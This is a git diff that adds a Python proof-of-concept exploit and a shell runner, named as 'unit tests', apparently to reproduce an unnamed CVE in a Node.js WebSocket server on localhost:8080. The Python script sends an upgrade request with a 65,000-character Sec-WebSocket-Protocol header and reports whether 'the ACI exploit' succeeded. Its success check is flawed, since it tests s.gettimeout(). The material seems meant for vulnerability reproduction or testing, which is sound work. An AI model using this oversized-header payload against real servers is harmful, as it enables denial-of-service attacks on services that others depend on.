
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 00000000..955f3a84
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,34 @@
+import socket
+
+def exploit():
+    try:
+        # Create a socket connection to the server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("localhost", 8080))  # Assuming the server is running on localhost and port 8080
+
+        # Craft a malicious header with a large size to exploit the CVE
+        header = "GET / HTTP/1.1\\r\\n" \
+                 "Host: localhost\\r\\n" \
+                 "Connection: Upgrade\\r\\n" \
+                 "Upgrade: websocket\\r\\n" \
+                 "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\\r\\n" \
+                 "Sec-WebSocket-Protocol: " + "a" * 65000 + "\\r\\n" \
+                 "Sec-WebSocket-Version: 13\\r\\n\\r\\n"
+
+        # Send the malicious header to the server
+        s.send(header.encode())
+        response = s.recv(1024).decode()
+
+        # Check if the server responds with an error or times out
+        if "HTTP/1.1 400 Bad Request" in response or s.gettimeout():
+            print("The ACI exploit failed!!!")
+        else:
+            print("The ACI exploit success!!!")
+    except Exception as e:
+        print("The ACI exploit failed!!!")
+        print(str(e))
+    finally:
+        s.close()
+
+# Run the exploit
+exploit()
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100755
index 00000000..4b78aae5
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+# Setup the environment
+echo "Setting up the environment..."
+# Assuming the use of nvm and node, install the correct version
+nvm install 14
+nvm use 14
+
+# Install necessary npm packages
+npm install
+
+# Run the Python script to test for the CVE
+echo "Running the CVE exploit test..."
+python ACI_unit_test.py
